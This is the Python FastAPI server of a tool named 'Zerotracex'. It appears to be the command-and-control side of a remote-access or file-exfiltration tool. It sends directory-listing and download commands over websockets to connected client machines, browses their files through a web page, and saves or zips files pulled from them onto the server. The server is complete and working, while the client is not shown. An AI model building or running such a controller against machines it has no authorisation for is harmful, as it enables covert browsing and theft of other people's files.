from fastapi import FastAPI, WebSocket, Request
from fastapi.responses import HTMLResponse, Response, FileResponse
from fastapi.staticfiles import StaticFiles
import uvicorn
from typing import Dict
import json
import os
from datetime import datetime
import asyncio
from pathlib import Path
import shutil
import zipfile
import io

from .models.client import ClientData
from .handlers.file_manager import FileManagerHandler

# Make app available for import
app = FastAPI(title="Zerotracex")
file_manager = FileManagerHandler()
file_manager.app = app  # Pass the app instance to the handler

# Store connected clients
clients: Dict[str, ClientData] = {}
websocket_clients: Dict[str, WebSocket] = {}

# Store last known directory state
directory_cache: Dict[str, dict] = {}

# Add after existing initialization code
STORAGE_DIR = "server_storage"
if not os.path.exists(STORAGE_DIR):
    os.makedirs(STORAGE_DIR)

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    client_id = f"{websocket.client.host}:{websocket.client.port}"
    
    try:
        # Create client data
        client_data = ClientData((websocket.client.host, websocket.client.port))
        clients[websocket.client.host] = client_data
        websocket_clients[websocket.client.host] = websocket
        
        # Request initial directory listing
        await websocket.send_text("PATH:.")
        
        while True:
            try:
                message = await websocket.receive()
                message_type = message.get("type")
                
                if message_type == "websocket.disconnect":
                    break
                
                if message_type == "websocket.receive":
                    data = message.get("text") or message.get("bytes")
                    if not data:
                        continue
                    
                    if isinstance(data, str):
                        # Handle JSON directory data
                        files_data = json.loads(data)
                        client_data.files = files_data
                        client_data.last_update = datetime.now()
                        directory_cache[client_data.current_path] = files_data
                    else:
                        # Handle binary file data
                        client_data.last_file_data = data
                        
            except Exception as e:
                print(f"[!] Error processing message: {e}")
                continue
            
    except Exception as e:
        print(f"[!] Error handling websocket client {client_id}: {e}")
    finally:
        if websocket.client.host in clients:
            del clients[websocket.client.host]
        if websocket.client.host in websocket_clients:
            del websocket_clients[websocket.client.host]
        print(f"[-] WebSocket client disconnected: {client_id}")

@app.get("/")
async def get_directory(request: Request):
    # For web browser requests, use the connected client's data
    connected_clients = list(clients.keys())
    if not connected_clients:
        return HTMLResponse(content="No clients connected", status_code=404)
    
    # Use the first connected client
    client_ip = connected_clients[0]
    client_data = clients[client_ip]
    
    path = request.query_params.get('path', '.')
    
    # Request fresh directory contents from client
    websocket = websocket_clients.get(client_ip)
    if websocket:
        try:
            # Send path request
            await websocket.send_text(f"PATH:{path}")
            client_data.current_path = path
            
            # Wait for response with timeout
            try:
                for _ in range(10):  # Try for 1 second (10 * 0.1)
                    if path in directory_cache:
                        client_data.files = directory_cache[path]
                        break
                    await asyncio.sleep(0.1)
            except asyncio.TimeoutError:
                print(f"Timeout waiting for directory contents: {path}")
        except Exception as e:
            print(f"Error requesting directory contents: {e}")
    
        # Generate HTML content
        html_content = await file_manager.generate_directory_listing(client_data, path)
        return HTMLResponse(content=html_content)
    
    return HTMLResponse(content="Client not connected", status_code=404)

@app.get("/download")
async def download_file(request: Request, path: str):
    connected_clients = list(clients.keys())
    if not connected_clients:
        return HTMLResponse(content="No clients connected", status_code=404)
    
    client_ip = connected_clients[0]
    websocket = websocket_clients.get(client_ip)
    client_data = clients[client_ip]
    
    if websocket:
        try:
            # Clear any previous file data
            client_data.last_file_data = None
            
            # Request file from client
            await websocket.send_text(f"DOWNLOAD:{path}")
            
            # Wait for file data response with timeout
            for _ in range(50):  # 5 seconds timeout
                if client_data.last_file_data is not None:
                    file_data = client_data.last_file_data
                    client_data.last_file_data = None  # Clear after use
                    
                    filename = os.path.basename(path)
                    return Response(
                        content=file_data,
                        media_type='application/octet-stream',
                        headers={
                            'Content-Disposition': f'attachment; filename="{filename}"'
                        }
                    )
                await asyncio.sleep(0.1)
            
            return HTMLResponse(content="Download timeout", status_code=408)
            
        except Exception as e:
            print(f"Error downloading file: {e}")
            return HTMLResponse(content="Download error", status_code=500)
    
    return HTMLResponse(content="Client not connected", status_code=404)

@app.post("/save")
async def save_file(request: Request, path: str):
    connected_clients = list(clients.keys())
    if not connected_clients:
        return HTMLResponse(content="No clients connected", status_code=404)
    
    client_ip = connected_clients[0]
    websocket = websocket_clients.get(client_ip)
    client_data = clients[client_ip]
    
    if websocket:
        try:
            # Clear any previous file data
            client_data.last_file_data = None
            
            # Request file from client
            await websocket.send_text(f"DOWNLOAD:{path}")
            
            # Wait for file data response with timeout
            for _ in range(50):  # 5 seconds timeout
                if client_data.last_file_data is not None:
                    file_data = client_data.last_file_data
                    client_data.last_file_data = None  # Clear after use
                    
                    filename = os.path.basename(path)
                    save_path = os.path.join(STORAGE_DIR, filename)
                    
                    # Save file with timestamp to avoid duplicates
                    if os.path.exists(save_path):
                        name, ext = os.path.splitext(filename)
                        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                        save_path = os.path.join(STORAGE_DIR, f"{name}_{timestamp}{ext}")
                    
                    with open(save_path, 'wb') as f:
                        f.write(file_data)
                    
                    return Response(content="File saved successfully")
                await asyncio.sleep(0.1)
            
            return HTMLResponse(content="Save timeout", status_code=408)
            
        except Exception as e:
            print(f"Error saving file: {e}")
            return HTMLResponse(content="Save error", status_code=500)
    
    return HTMLResponse(content="Client not connected", status_code=404)

@app.get("/saved-files")
async def list_saved_files():
    try:
        files = []
        for filename in os.listdir(STORAGE_DIR):
            file_path = os.path.join(STORAGE_DIR, filename)
            stat = os.stat(file_path)
            files.append({
                'name': filename,
                'size': stat.st_size,
                'mtime': stat.st_mtime,
                'path': f"/download-saved/{filename}"
            })
        return files
    except Exception as e:
        print(f"Error listing saved files: {e}")
        return []

@app.get("/download-saved/{filename}")
async def download_saved_file(filename: str):
    try:
        file_path = os.path.join(STORAGE_DIR, filename)
        if os.path.exists(file_path):
            return FileResponse(
                path=file_path,
                filename=filename,
                media_type='application/octet-stream'
            )
        return HTMLResponse(content="File not found", status_code=404)
    except Exception as e:
        print(f"Error downloading saved file: {e}")
        return HTMLResponse(content="Download error", status_code=500)

@app.post("/download-zip")
async def download_zip(request: Request):
    try:
        # Get file paths from request body
        body = await request.json()
        paths = body.get('paths', [])
        
        if not paths:
            return HTMLResponse(content="No files selected", status_code=400)
            
        # Create ZIP file in memory
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            # Handle both regular and saved files
            for path in paths:
                if path.startswith('/download-saved/'):
                    # Handle saved files
                    filename = path.replace('/download-saved/', '')
                    file_path = os.path.join(STORAGE_DIR, filename)
                    if os.path.exists(file_path):
                        zip_file.write(file_path, filename)
                else:
                    # Handle regular files
                    client_ip = list(clients.keys())[0]
                    websocket = websocket_clients.get(client_ip)
                    client_data = clients[client_ip]
                    
                    if websocket:
                        # Clear previous file data
                        client_data.last_file_data = None
                        
                        # Request file from client
                        await websocket.send_text(f"DOWNLOAD:{path}")
                        
                        # Wait for file data
                        for _ in range(50):  # 5 seconds timeout
                            if client_data.last_file_data is not None:
                                filename = os.path.basename(path)
                                zip_file.writestr(filename, client_data.last_file_data)
                                client_data.last_file_data = None
                                break
                            await asyncio.sleep(0.1)
        
        # Get ZIP data
        zip_data = zip_buffer.getvalue()
        zip_buffer.close()
        
        # Return ZIP file
        return Response(
            content=zip_data,
            media_type='application/zip',
            headers={
                'Content-Disposition': f'attachment; filename="selected_files.zip"'
            }
        )
        
    except Exception as e:
        print(f"Error creating ZIP: {e}")
        return HTMLResponse(content="Error creating ZIP file", status_code=500)

def start(host="0.0.0.0", port=8080):
    print(f"[*] Server starting on http://{host}:{port}")
    print(f"[*] Local access: http://127.0.0.1:{port}")
    print(f"[*] Network access: http://{get_local_ip()}:{port}")
    uvicorn.run(app, host=host, port=port)

def get_local_ip():
    try:
        # Get local IP address
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "0.0.0.0"

if __name__ == "__main__":
    start() 